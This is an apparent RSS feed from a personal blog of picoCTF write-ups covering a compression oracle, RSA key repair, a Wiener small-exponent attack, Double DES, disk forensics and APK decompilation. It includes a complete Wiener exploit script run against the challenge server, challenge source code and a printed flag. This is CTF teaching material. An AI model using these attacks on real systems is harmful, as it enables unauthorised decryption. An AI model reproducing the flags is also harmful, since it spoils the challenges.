&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; len&lt;span style="color:#f92672">(&lt;/span>enc&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">34&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此時重複的部分就是&lt;code>picoCTF{&lt;/code>，若是繼續增加重複的部分(例如：&lt;code>picoCTF{te&lt;/code>)，壓縮後的長度也不會變，這樣就可以當作一個oracle，也就是利用長度來判斷增加的字元是不是flag重複的一部分&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/python3 -u

import zlib
from random import randint
import os
from Crypto.Cipher import Salsa20

flag = open(&amp;#34;./flag&amp;#34;).read()


def compress(text):
 return zlib.compress(bytes(text.encode(&amp;#34;utf-8&amp;#34;)))

def encrypt(plaintext):
 secret = os.urandom(32)
 cipher = Salsa20.new(key=secret)
 return cipher.nonce + cipher.encrypt(plaintext)

def main():
 while True:
 usr_input = input(&amp;#34;Enter your text to be encrypted: &amp;#34;)
 compressed_text = compress(flag + usr_input)
 encrypted = encrypt(compressed_text)
 
 nonce = encrypted[:8]
 encrypted_text = encrypted[8:]
 print(nonce)
 print(encrypted_text)
 print(len(encrypted_text))

if __name__ == &amp;#39;__main__&amp;#39;:
 main()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Cookies</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---cookies/</guid><description>&lt;h1 id="picoctf---cookies">
 PicoCTF - Cookies
 &lt;a class="anchor" href="#picoctf---cookies">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://mercury.picoctf.net:64944/">http://mercury.picoctf.net:64944/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>-H參數添加 HTTP 請求的標頭。
&lt;code>$ curl -H 'Accept-Language: en-US' https://google.com&lt;/code>&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>-s參數將不輸出錯誤和進度信息。
&lt;code>$ curl -s https://www.example.com&lt;/code>&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>-L參數會讓 HTTP 請求跟隨服務器的重定向。curl 默認不跟隨重定向。
&lt;code>$ curl -L -d 'tweet=hi' https://api.twitter.com/tweet&lt;/code>&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>-I參數向服務器發出 HEAD 請求，然會將服務器返回的 HTTP 標頭打印出來。
&lt;code>$ curl -I https://www.example.com&lt;/code>&lt;/p>&lt;/blockquote>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Try to analyze
When I input something, it&amp;rsquo;ll redirect to another page
&lt;img src="https://i.imgur.com/Pq7XpNZ.png" alt="" />
&lt;img src="https://i.imgur.com/pKZJWfd.png" alt="" />
I tried to change cookie to different number and also modify the different value of &lt;code>name&lt;/code> parameter however, still got wrong information.&lt;/p></description></item><item><title>PicoCTF - corrupt-key-1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/</guid><description>&lt;h1 id="picoctf---corrupt-key-1">
 PicoCTF - corrupt-key-1
 &lt;a class="anchor" href="#picoctf---corrupt-key-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>private.key
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>-----BEGIN RSA PRIVATE KEY-----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MIICXAIBAAKBgQC4yxzKmbasQYdsGIRXMqXL/Idd80bukALOYIUItfz2tgpax3Iq
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LWTvdOFEOjOOcKc+Y6MD86ya3xmFlWmfbp8wwAnSGcfZjE7IQgNhCDQCnHlWfvwI
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>9mtLw/Vkv7VxVGoGt+SPs1u5zOqaLNRDSfgpJCB436ZNUlknv9VdCZwCTwIDAQAB
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AoGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQQDnAFaP9Qa9WJKv
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>klkhJeBsvpvUXf6v6TGjM8E0YwI9TwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAkEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJBAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----END RSA PRIVATE KEY-----
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>msg.enc
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>71dc d160 9ac4 a05c d14f 04a9 b43c 2aa3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>83d2 a8d6 749b b978 75d5 437a a944 45f2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4073&lt;/span> f605 ef1c &lt;span style="color:#ae81ff">5657&lt;/span> 8d0e 7a2d f3be b5c1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7741&lt;/span> &lt;span style="color:#ae81ff">8476&lt;/span> 0b3d 44fc b97e &lt;span style="color:#ae81ff">6631&lt;/span> b6fe &lt;span style="color:#ae81ff">2487&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6258&lt;/span> d445 a7d7 4c7c e3cc 00ec f925 f442
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c91d 10c9 cefb 9ca6 9c88 da3c 9d26 6c96
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">9033&lt;/span> 63d5 6a13 7b64 1fc3 &lt;span style="color:#ae81ff">8709&lt;/span> &lt;span style="color:#ae81ff">2416&lt;/span> f7fb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eb4c 4c94 cc8e 157f cc0e d122 159c 27d5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>可見private.key的內文被corrupted了，必須要修復才能夠解密ciphertext，但看來看去也找不到相關的write up，或是修復的方法，從&lt;a href="https://connor-mccartney.github.io/cryptography/rsa/corrupt-key-1-picoMini">連結&lt;/a>這篇write up也看不懂如何修復，雖然他有附上code，但是很多error也無法debug(主要是看不懂)，總而言之我們的目標就是找出$p$為何&lt;/p></description></item><item><title>PicoCTF - Dachshund Attacks</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/</guid><description>&lt;h1 id="picoctf---dachshund-attacks">
 PicoCTF - Dachshund Attacks
 &lt;a class="anchor" href="#picoctf---dachshund-attacks">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>How about if the private key is too small? Refer &lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/d_attacks/rsa_extending_wiener/">Extending Wiener’s Attack &lt;/a>&lt;/p>
&lt;h2 id="exploit---small-private-key">
 Exploit - Small Private Key
 &lt;a class="anchor" href="#exploit---small-private-key">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>git clone &lt;a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack&lt;/a>
Put the exploit file in this repo.&lt;/li>
&lt;li>Whole Exploit
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> long_to_bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> ContinuedFractions&lt;span style="color:#f92672">,&lt;/span> Arithmetic
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#34;mercury.picoctf.net&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">37455&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">wiener_hack&lt;/span>(e, n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> frac &lt;span style="color:#f92672">=&lt;/span> ContinuedFractions&lt;span style="color:#f92672">.&lt;/span>rational_to_contfrac(e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> convergents &lt;span style="color:#f92672">=&lt;/span> ContinuedFractions&lt;span style="color:#f92672">.&lt;/span>convergents_from_contfrac(frac)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (k, d) &lt;span style="color:#f92672">in&lt;/span> convergents:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> k &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">and&lt;/span> (e &lt;span style="color:#f92672">*&lt;/span> d &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">%&lt;/span> k &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> phi &lt;span style="color:#f92672">=&lt;/span> (e &lt;span style="color:#f92672">*&lt;/span> d &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">//&lt;/span> k
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> n &lt;span style="color:#f92672">-&lt;/span> phi &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> discr &lt;span style="color:#f92672">=&lt;/span> s &lt;span style="color:#f92672">*&lt;/span> s &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">*&lt;/span> n
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (discr &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> Arithmetic&lt;span style="color:#f92672">.&lt;/span>is_perfect_square(discr)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> t &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">and&lt;/span> (s &lt;span style="color:#f92672">+&lt;/span> t) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Hacked!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>recvline()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e &lt;span style="color:#f92672">=&lt;/span> int(str(r&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()&lt;span style="color:#f92672">.&lt;/span>decode())&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n &lt;span style="color:#f92672">=&lt;/span> int(str(r&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()&lt;span style="color:#f92672">.&lt;/span>decode())&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c &lt;span style="color:#f92672">=&lt;/span> int(str(r&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()&lt;span style="color:#f92672">.&lt;/span>decode())&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d &lt;span style="color:#f92672">=&lt;/span> wiener_hack(e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(long_to_bytes(pow(c, d, n)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://zhuanlan.zhihu.com/p/76228394">CTF_RSA解密学习指南(三) - 低解密指数攻击&lt;/a>&lt;/p></description></item><item><title>PicoCTF - Disk, disk, sleuth! II</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/</guid><description>&lt;h1 id="picoctf---disk-disk-sleuth-ii">
 PicoCTF - Disk, disk, sleuth! II
 &lt;a class="anchor" href="#picoctf---disk-disk-sleuth-ii">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/137?category=4&amp;amp;page=2">Disk, disk, sleuth! II&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>All we know is the file with the flag is named &lt;code>down-at-the-bottom.txt&lt;/code>&amp;hellip; Disk image: &lt;code>dds2-alpine.flag.img.gz&lt;/code>
Hint 1: The sleuthkit has some great tools for this challenge as well.
Hint 2: Sleuthkit docs here are so helpful: &lt;a href="http://wiki.sleuthkit.org/index.php?title=TSK_Tool_Overview">TSK Tool Overview&lt;/a>
Hint 3: This disk can also be booted with &lt;a href="https://idobest.pixnet.net/blog/post/22040213">qemu&lt;/a>!&lt;/p></description></item><item><title>PicoCTF - dont-use-client-side</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/</guid><description>&lt;h1 id="picoctf---dont-use-client-side">
 PicoCTF - dont-use-client-side
 &lt;a class="anchor" href="#picoctf---dont-use-client-side">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/66?category=1&amp;amp;page=1">dont-use-client-side&lt;/a>&lt;/p>
&lt;h2 id="exploit---page-source-code">
 Exploit - Page source code
 &lt;a class="anchor" href="#exploit---page-source-code">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://i.imgur.com/UBYEt6F.png" alt="" />
&lt;code>picoCTF{no_clients_plz_b706c5}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Double DES</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/des-aes/picoctf---double-des/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/des-aes/picoctf---double-des/</guid><description>&lt;h1 id="picoctf---double-des">
 PicoCTF - Double DES
 &lt;a class="anchor" href="#picoctf---double-des">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Meet in the middle attack&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/python3 -u
from Crypto.Cipher import DES
import binascii
import itertools
import random
import string


def pad(msg):
 block_len = 8
 over = len(msg) % block_len
 pad = block_len - over
 return (msg + &amp;#34; &amp;#34; * pad).encode()

def generate_key():
 return pad(&amp;#34;&amp;#34;.join(random.choice(string.digits) for _ in range(6)))


FLAG = open(&amp;#34;flag&amp;#34;).read().rstrip()
KEY1 = generate_key()
KEY2 = generate_key()


def get_input():
 try:
 res = binascii.unhexlify(input(&amp;#34;What data would you like to encrypt? &amp;#34;).rstrip()).decode()
 except:
 res = None
 return res

def double_encrypt(m):
 msg = pad(m)

 cipher1 = DES.new(KEY1, DES.MODE_ECB)
 enc_msg = cipher1.encrypt(msg)
 cipher2 = DES.new(KEY2, DES.MODE_ECB)
 return binascii.hexlify(cipher2.encrypt(enc_msg)).decode()


print(&amp;#34;Here is the flag:&amp;#34;)
print(double_encrypt(FLAG))

while True:
 inputs = get_input()
 if inputs:
 print(double_encrypt(inputs))
 else:
 print(&amp;#34;Invalid input.&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - droids1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids1/</guid><description>&lt;h1 id="picoctf---droids1">
 PicoCTF - droids1
 &lt;a class="anchor" href="#picoctf---droids1">#&lt;/a>
&lt;/h1>
&lt;h2 id="backgroud">
 Backgroud
 &lt;a class="anchor" href="#backgroud">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-1/"> Android App 逆向入門之一：拆開與重組 apk &lt;/a>: 強烈建議新手在打之前可以先看一下這篇，稍微了解一下整體怎麼包apk以及比要檔案有哪些，或是他們儲存的資料類型之類的&lt;/p>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://ibotpeaches.github.io/Apktool/">apktool&lt;/a>
跟著&lt;a href="https://apktool.org/docs/install">installation guide&lt;/a>就可以安裝成功，此工具目的在於拆解apk，我們知道apk就是一個壓縮檔，如果直接用unzip這種指令，也可以打開，只不過一些經過編譯後的byte code就還是byte code，而apktool可以在解壓縮的同時還原這些byte code&lt;/li>
&lt;li>&lt;a href="https://developer.android.com/studio">Android Studio&lt;/a>: 此工具目的在於利用emulator把該軟體安裝後跑起來&lt;/li>
&lt;li>&lt;a href="https://github.com/skylot/jadx">JADX&lt;/a>: 和ApkTool一樣，可以反編譯apk，但有GUI(Recommended)
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!"> $ wget https://github.com/skylot/jadx/releases/download/v1.1.0/jadx-1.1.0.zip
 $ unzip jadx-1.1.0.zip -d jadx
 $ cd jadx
 $ cd ./bin
 $ ./jadx-gui
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有兩種方法可以反編譯apk，一種是利用ApkTool，另外一個是JADX，兩者差在有無GUI(JADX有)，主要是參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>的WP&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;h3 id="apktools">
 ApkTools
 &lt;a class="anchor" href="#apktools">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ apktool d one.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Using Apktool 2.8.1 on one.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Loading resource table...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Decoding AndroidManifest.xml with resources...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Loading resource table from file: C:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\a&lt;/span>pktool&lt;span style="color:#ae81ff">\f&lt;/span>ramework&lt;span style="color:#ae81ff">\1&lt;/span>.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Regular manifest package...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Decoding file-resources...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Decoding values */* XMLs...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Baksmaling classes.dex...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Copying assets and libs...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Copying unknown files...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Copying original files...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果有按照上面的guide把apktool裝起來，就可以直接下指令，參數&lt;code>d&lt;/code>代表decode，對於比較熟Android架構的人來說應該綽綽有餘，畢竟要到哪邊找code/strings之類的，通常都會是那幾個地方，例如：
Code會放在&lt;code>./smali/com/hellocmu/picoctf/&lt;/code>(PS: 只不過code很醜，畢竟是smali)
Strings會放在&lt;code>./res/values/strings.xml&lt;/code>&lt;/p></description></item><item><title>PicoCTF - droids3</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids3/</guid><description>&lt;h1 id="picoctf---droids3">
 PicoCTF - droids3
 &lt;a class="anchor" href="#picoctf---droids3">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-1/"> Android App 逆向入門之一：拆開與重組 apk &lt;/a>
&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-2/"> Android App 逆向入門之二：修改 smali 程式碼 &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
